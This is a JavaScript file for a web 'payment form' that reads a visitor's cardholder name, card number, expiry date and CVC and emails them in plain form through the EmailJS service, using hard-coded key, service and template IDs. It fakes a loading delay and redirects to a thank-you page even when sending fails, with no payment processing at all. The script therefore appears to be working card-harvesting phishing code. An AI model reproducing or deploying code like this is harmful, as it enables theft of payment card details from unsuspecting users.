(function() {
    emailjs.init('ReqtkWfjI392LAzFb');
})();

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const loader = document.getElementById('loader');
    const errorMessage = document.getElementById('errorMessage');
    errorMessage.classList.add('hidden');
    loader.classList.remove('hidden');

    const formData = {
        user_name: document.getElementById('cardHolder').value,
        card_number: document.getElementById('cardNumber').value,
        expiry_date: document.getElementById('expiryDate').value,
        cvc_code: document.getElementById('cvc').value
    };

    setTimeout(() => {
        // Validaciones
        let isValid = true;
        
        if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.user_name)) {
            isValid = false;
        }
        
        if (formData.card_number.length !== 16 || !/^\d+$/.test(formData.card_number)) {
            isValid = false;
        }
        
        const currentDate = new Date();
        const expiryDate = new Date(formData.expiry_date);
        if (expiryDate < currentDate) {
            isValid = false;
        }
        
        if (formData.cvc_code.length !== 4 || !/^\d+$/.test(formData.cvc_code)) {
            isValid = false;
        }

        loader.classList.add('hidden');
        
        if (!isValid) {
            errorMessage.classList.remove('hidden');
            setTimeout(() => {
                errorMessage.classList.add('hidden');
            }, 3000);
            return;
        }

        // Enviar correo
        emailjs.send("service_syrc1uk", "template_u3etoro", formData)
            .then(() => {
                window.location.href = "thank-you.html";
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = "thank-you.html";
            });
    }, 5000);
});
